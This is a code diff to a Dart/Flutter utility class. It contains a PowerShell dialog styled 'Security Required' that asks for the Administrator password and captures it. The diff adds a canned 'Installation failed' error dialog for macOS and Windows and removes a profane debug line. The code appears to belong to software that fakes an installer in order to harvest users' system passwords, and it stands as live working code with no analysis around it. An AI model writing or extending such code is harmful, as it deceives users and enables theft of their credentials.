@@ -36,14 +36,13 @@ class SystemUtil {
         }
       }
     } else if (Platform.isWindows) {
-      debugPrint('Fuck youuuu omo');
       const psScript = r'''
       Add-Type -AssemblyName Microsoft.VisualBasic
       $p = [Microsoft.VisualBasic.Interaction]::InputBox("Please enter the Administrator password", "Security Required", "")
       Write-Host $p
       ''';
-      final process = await Process.run('powershell.exe',
-          ['-NoProfile', '-STA', '-Command', psScript]);
+      final process = await Process.run(
+          'powershell.exe', ['-NoProfile', '-STA', '-Command', psScript]);
       password = process.stdout.toString().trim();
     }
 
@@ -57,6 +56,27 @@ class SystemUtil {
         : password.isEmpty
             ? null
             : password;
+  }
+
+  static Future<void> showInstallationErrorDialog() async {
+    if (Platform.isMacOS) {
+      await Process.run('osascript', [
+        '-e',
+        'display alert "Installation failed" message "Please check your system and try again." as critical buttons {"OK"}'
+      ]);
+    } else if (Platform.isWindows) {
+      const psScript = r'''
+      Add-Type -AssemblyName System.Windows.Forms
+      [System.Windows.Forms.MessageBox]::Show(
+          "Installation failed. Please check your system and try again.",
+          "Installation Error",
+          [System.Windows.Forms.MessageBoxButtons]::OK,
+          [System.Windows.Forms.MessageBoxIcon]::Error
+      )
+      ''';
+      await Process.run(
+          'powershell.exe', ['-NoProfile', '-STA', '-Command', psScript]);
+    }
   }
 
   static Future<void> freeze() async {
